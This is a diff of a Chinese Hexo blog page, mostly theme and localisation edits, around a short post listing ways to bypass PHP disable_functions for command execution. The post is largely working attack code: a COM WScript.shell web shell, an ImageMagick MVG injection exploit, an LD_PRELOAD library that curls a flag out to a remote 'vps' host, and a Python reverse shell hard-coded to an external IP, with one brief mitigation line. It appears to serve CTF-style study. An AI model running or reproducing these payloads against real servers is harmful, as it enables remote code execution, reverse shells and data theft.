@@ -5,11 +5,11 @@
   
 
 
-<html class="theme-next mist use-motion" lang="en">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="web,">
+  <meta name="keywords" content="web," />
 
 
 
@@ -80,35 +80,35 @@
 
 
 <meta name="description" content="几种绕过php disable_function限制的方式">
-<meta name="keywords" content="web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php绕过disable_function命令执行">
-<meta property="og:url" content="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/index.html">
+<meta property="og:url" content="http://yoursite.com/2020/06/13/php%E7%BB%95%E8%BF%87disable-function%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
 <meta property="og:description" content="几种绕过php disable_function限制的方式">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/1.png">
-<meta property="og:updated_time" content="2020-08-01T04:38:49.370Z">
+<meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2020/06/13/php%E7%BB%95%E8%BF%87disable-function%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
+<meta property="article:published_time" content="2020-06-13T11:55:46.000Z">
+<meta property="article:modified_time" content="2020-08-01T04:38:49.370Z">
+<meta property="article:author" content="lockcy">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php绕过disable_function命令执行">
-<meta name="twitter:description" content="几种绕过php disable_function限制的方式">
-<meta name="twitter:image" content="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/06/13/php%E7%BB%95%E8%BF%87disable-function%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Mist',
     version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
     fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     duoshuo: {
       userId: '0',
-      author: 'Author'
+      author: '博主'
     },
     algolia: {
       applicationID: '',
@@ -122,7 +122,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/">
+  <link rel="canonical" href="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/"/>
 
 
 
@@ -138,9 +138,9 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
   
@@ -156,7 +156,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">lockcy's cave</span>
         <span class="logo-line-after"><i></i></span>
@@ -184,41 +184,41 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Home
+            首页
           </a>
         </li>
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
+          <a href="/about/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
-            About
+            关于
           </a>
         </li>
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
+          <a href="/tags/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
-            Tags
+            标签
           </a>
         </li>
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archives
+            归档
           </a>
         </li>
       
@@ -255,12 +255,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/13/php绕过disable-function命令执行/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/13/php%E7%BB%95%E8%BF%87disable-function%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ICCTW">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/harutya.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -282,9 +282,9 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-13T19:55:46+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-13T19:55:46+08:00">
                 2020-06-13
               </time>
             
@@ -306,6 +306,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  369
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
 
           
 
@@ -323,30 +354,35 @@
 
       
         <p>几种绕过php disable_function限制的方式</p>
-<a id="more"></a>
+<span id="more"></span>
 <p>1.window com组件<br>仅windows下适用，主要是php5.4，其他版本需要自己添加<br>php.ini配置<br>extension=php_com_dotnet.dll</p>
-<img src="/2020/06/13/php绕过disable-function命令执行/1.png">
+<img src="/2020/06/13/php%E7%BB%95%E8%BF%87disable-function%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class="">
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command=$_GET[&apos;a&apos;];</span><br><span class="line">$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command); //调用对象方法来执行命令</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c &quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>彻底的解决方案是 直接删除System32目录下wshom.ocx文件</p>
 <p>2.利用ImageMagick漏洞绕过disable_function<br>phpinfo中显示相关配置信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&apos;disable_functions&apos;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == &apos;cli&apos; ? $argv[1] : $_GET[&apos;cmd&apos;];</span><br><span class="line">if ($command == &apos;&apos;) &#123;</span><br><span class="line">    $command = &apos;id&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|$command&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb = new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&apos;KKKK.mvg&apos;);</span><br><span class="line">$thumb-&gt;writeImage(&apos;KKKK.png&apos;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($command &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    $command &#x3D; &#39;id&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);</span><br><span class="line">$thumb-&gt;writeImage(&#39;KKKK.png&#39;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>3.利用环境变量LD_PRELOAD来绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;curl vps:6666/`/readflag`&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;curl vps:6666&#x2F;&#96;&#x2F;readflag&#96;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>gcc a.c -fPIC -shared -o a.so</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   putenv(&quot;LD_PRELOAD=/var/www/html/a.so&quot;);</span><br><span class="line">   mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">   //error_log(&apos;&apos;,1);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.so&quot;);</span><br><span class="line">   mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">   &#x2F;&#x2F;error_log(&#39;&#39;,1);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
+
 
 <p>4.pcntl_exec<br>版本要求：PHP 4 &gt;= 4.2.0, PHP 5<br><?php  pcntl_exec("/usr/bin/python",array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("47.101.196.184",8088));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));?></p>
-<p><a href="https://blog.csdn.net/weixin_43999372/article/details/87925442" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43999372/article/details/87925442</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43999372/article/details/87925442">https://blog.csdn.net/weixin_43999372/article/details/87925442</a></p>
 
       
     </div>
     
     
     
+<div>
+      
+        
+
+      
+</div>
 
     
 
@@ -371,7 +407,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/05/09/weex开发实战（一）/" rel="next" title="weex开发实战（一）">
+              <a href="/2020/05/09/weex%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" rel="next" title="weex开发实战（一）">
                 <i class="fa fa-chevron-left"></i> weex开发实战（一）
               </a>
             
@@ -381,7 +417,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/08/01/frp内网穿透笔记/" rel="prev" title="frp内网穿透笔记">
+              <a href="/2020/08/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%AC%94%E8%AE%B0/" rel="prev" title="frp内网穿透笔记">
                 frp内网穿透笔记 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -431,7 +467,9 @@
   <aside id="sidebar" class="sidebar">
     
     <div class="sidebar-inner">
-
+		<div id="music163player">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
+		</div>
       
 
       
@@ -440,7 +478,11 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <p class="site-author-name" itemprop="name">ICCTW</p>
+              <img class="site-author-image" itemprop="image"
+                src="/images/harutya.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -449,10 +491,10 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">40</span>
-                  <span class="site-state-item-name">posts</span>
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
@@ -465,7 +507,7 @@
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
                   <span class="site-state-item-count">12</span>
-                  <span class="site-state-item-name">tags</span>
+                  <span class="site-state-item-name">标签</span>
                 </a>
               </div>
             
@@ -475,9 +517,26 @@
           
 
           
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lockcy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:lockcysec@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
 
           
           
+
 
           
           
@@ -489,6 +548,13 @@
 
       
 
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
       
 
     </div>
@@ -505,13 +571,22 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">ICCTW</span>
+  <span class="author" itemprop="copyrightHolder">lockcy</span>
 
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">34.8k</span>
   
 </div>
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
@@ -519,7 +594,7 @@
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 
 
 
@@ -527,7 +602,7 @@
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
 <span class="post-meta-divider">|</span>
-<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv" < span>人</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"</span>人</span>
 
 
 
@@ -539,15 +614,10 @@
 
 
 
-        
-      </span></div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
         
       </div>
+    </footer>
+
     
 
     
@@ -700,5 +770,6 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</body>
 </html>
+<script src="/live2d-widget/autoload.js"></script>
